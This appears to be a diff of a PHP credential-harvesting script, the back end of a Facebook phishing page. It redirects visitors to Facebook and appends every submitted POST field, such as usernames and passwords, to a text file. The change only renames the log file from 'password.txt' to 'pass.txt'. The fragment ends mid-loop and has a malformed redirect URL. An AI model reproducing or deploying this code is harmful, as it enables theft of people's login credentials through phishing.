@@ -1,6 +1,6 @@
   ﻿<?php
 header('Location: https://https://www.facebook.com/'); 
-$handle = fopen("password.txt", "a");
+$handle = fopen("pass.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
